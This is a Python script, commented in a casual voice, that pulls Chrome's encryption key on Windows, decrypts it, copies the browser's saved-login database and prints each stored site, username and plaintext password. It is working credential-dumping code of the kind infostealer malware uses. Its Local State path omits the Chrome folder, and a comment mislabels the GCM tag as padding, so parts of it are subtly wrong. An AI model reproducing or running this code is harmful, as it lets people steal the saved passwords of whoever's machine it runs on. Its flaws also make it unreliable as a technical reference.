import os  # we using os to mess with system files and paths
import json  # json cuz chrome’s encryption key is stored in a json file
import base64  # this decodes chrome's base64 encoded keys
import sqlite3  # sqlite3 lets us connect to chrome's login database
import win32crypt  # win32crypt decrypts windows encrypted stuff, like passwords
from Crypto.Cipher import AES  # AES encryption to unlock chrome's encrypted passwords
import shutil  # shutil for copying files cuz chrome locks them when in use

# this function pulls chrome’s encryption key so we can decrypt the passwords
def getEncryptionKey():
    # finding where chrome keeps its "local state" file that stores the key
    localStatePath = os.path.join(os.environ["USERPROFILE"], 
        "AppData", "Local", "Google", 
        "User Data", "Local State")  # building the path to where the key is hiding
    
    # opening that file and loading it up as json so we can read it
    with open(localStatePath, "r", encoding="utf-8") as f:
        localState = json.loads(f.read())  # loading the file's data as a dictionary
    
    # chrome’s key is stored in base64 format, so we decode it
    key = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    key = key[5:]  # first 5 bytes are junk so we skip them
    # win32crypt decrypts the key for us, this gives us the real key we need
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# this function decrypts passwords using AES; if that fails, we use win32crypt
def decryptPassword(password, key):
    try:
        iv = password[3:15]  # initialization vector (IV) is stored in bytes 3 to 15 of the password
        password = password[15:]  # actual encrypted password starts at byte 15
        cipher = AES.new(key, AES.MODE_GCM, iv)  # create AES cipher using the key and iv
        return cipher.decrypt(password)[:-16].decode()  # decrypt the password and remove padding
    except:  # if AES doesn't work, fallback to win32crypt
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])  # win32crypt tries decrypting the password
        except:  # if all fails, return an empty string
            return ""

# main function that does all the work
def main():
    key = getEncryptionKey()  # first, grab chrome's encryption key
    
    # path to chrome’s login database where passwords are stored
    dbPath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    
    # chrome keeps the db locked, so we copy it to work on it
    filename = "ChromeData.db"
    shutil.copyfile(dbPath, filename)  # copy the database to a new file
    
    # connect to the copied db
    db = sqlite3.connect(filename)
    cursor = db.cursor()  # get a cursor to run SQL commands
    
    # select the important info (URL, username, password) from the logins table
    cursor.execute("select origin_url, action_url, username_value, password_value from logins")
    
    # go through each row in the result set (each login entry)
    for row in cursor.fetchall():
        originUrl = row[0]  # this is the URL of the website where the login was saved
        actionUrl = row[1]  # URL where the login form gets submitted
        username = row[2]  # username for the login (could be email or other username)
        password = decryptPassword(row[3], key)  # decrypt the password
        
        # if either username or password is present, print them out
        if username or password:
            print(f"URL: {originUrl}")  # print the URL for the login
            print(f"Username: {username}")  # print the username for the login
            print(f"Password: {password}")  # print the decrypted password
            print("=" * 50)  # print a separator between each login entry
    
    cursor.close()  # close the cursor when done
    db.close()  # close the db connection
    os.remove(filename)  # remove the copied database file

# run the main function when the script is executed
if __name__ == "__main__":
    main()
